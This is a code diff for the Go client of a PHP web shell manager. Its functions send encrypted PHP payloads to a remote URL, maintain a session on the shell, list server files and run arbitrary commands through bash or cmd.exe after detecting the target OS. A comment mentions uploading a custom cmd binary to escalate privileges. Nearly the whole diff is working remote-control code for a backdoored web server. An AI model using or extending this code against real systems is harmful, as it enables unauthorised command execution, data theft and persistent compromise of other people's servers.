@@ -2,8 +2,9 @@ package service
 
 import (
 	"clouddrop/pkg/util"
+	"fmt"
+	"log"
 	"os"
-	"strings"
 )
 
 var PhpSessions map[int]string
@@ -24,21 +25,20 @@ func (s *PHPShell) FreshSession(id int, url string, password string) (string, er
 	}
 	code = append(code, []byte("\nmain();")...) // add main() to call
 
+	// 加密code
 	enCode := util.Encrypt(string(code), password)
 
+	PhpSessions[id], _ = util.PostRequestWithoutSession(url, password, enCode)
 	session := PhpSessions[id] // if key not exist, it returns "" , bcz type is string
-	if session == "" {
-		PhpSessions[id], err = util.PostRequestWithoutSession(url, password, enCode)
-		return "FreshSession success id : " + PhpSessions[id], err
-	}
-
+	log.Println("当前PHPSESSID " + session)
 	enResult, err := util.PostRequest(url, password, enCode, session)
 	if err != nil {
 		return "", err
 	}
 	// 解密code
 	res := util.Decrypt(enResult, password)
-	return strings.TrimSpace(res), nil
+
+	return res, nil
 }
 
 // BaseInfo
@@ -48,47 +48,64 @@ func (s *PHPShell) BaseInfo(id int, url string, password string) (string, error)
 	if err != nil {
 		return "", err
 	}
-	code = append(code, []byte("\nmain();")...) // add main() to call
+	code = fmt.Append(code, "\nmain();") // add main() to call
 
-	// 加密code发送请求
-	enCode := util.Encrypt(string(code), password)
-	enResult, err := util.PostRequest(url, password, enCode, PhpSessions[id])
+	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
 	if err != nil {
 		return "", err
 	}
 
-	// 解密code
-	res := util.Decrypt(enResult, password)
-	return strings.TrimSpace(res), nil
+	return res, nil
 }
 
-// ListFiles lists all files in the current directory
-func (s *PHPShell) ListFiles(id int, url string, password string) ([]string, error) {
-	code := `
-	$files = scandir(getcwd());
-	foreach ($files as $file) {
-		if ($file != "." && $file != "..") {
-			echo $file . "\n";
-		}
-	}
-	`
-	result, err := util.PostRequest(url, password, code, PhpSessions[id])
+// FileList lists all files in the current directory
+func (s *PHPShell) FileList(id int, path string, url string, password string) (string, error) {
+	code, err := os.ReadFile("./pkg/api/php/FileList.php")
 	if err != nil {
-		return nil, err
+		return "", err
 	}
+	code = fmt.Appendf(code, "\nmain(\"%s\");", path)
 
-	files := strings.Split(strings.TrimSpace(result), "\n")
-	return files, nil
+	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
+	if err != nil {
+		return "", err
+	}
+	// todo 解析结果
+	return res, nil
 }
 
 // ExecCommand executes a command on the PHP shell and returns the output
-func (s *PHPShell) ExecCommand(id int, url string, password string, command string) (string, error) {
-	// Todo 分别处理win和类Unix系统的命令
-	code := `system(` + "`" + command + "`" + `);`
-	result, err := util.PostRequest(url, password, code, PhpSessions[id])
+func (s *PHPShell) ExecCommand(id int, command string, url string, password string) (string, error) {
+	// Todo 需要支持自己上传cmd。有时候可以提权
+	// 1. first need to get the system type
+	code, err := os.ReadFile("./pkg/api/php/OS.php")
+	if err != nil {
+		return "", err
+	}
+	code = fmt.Append(code, "\nmain();")
+
+	osType, err := util.HookPost(url, password, string(code), PhpSessions[id])
 	if err != nil {
 		return "", err
 	}
 
-	return strings.TrimSpace(result), nil
+	// 2. base on the osType, execute the command
+	code, err = os.ReadFile("./pkg/api/php/CMD.php")
+	if err != nil {
+		return "", err
+	}
+	var cmdPath string // if block-level scope, it must define at out
+	if osType == "Linux" {
+		cmdPath = "/bin/bash"
+	} else {
+		cmdPath = "C:/Windows/System32/cmd.exe"
+	}
+	code = fmt.Appendf(code, "\nmain(\"%s\",\"true\",\"%s\");", cmdPath, command)
+
+	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
+	if err != nil {
+		return "", err
+	}
+
+	return res, nil
 }
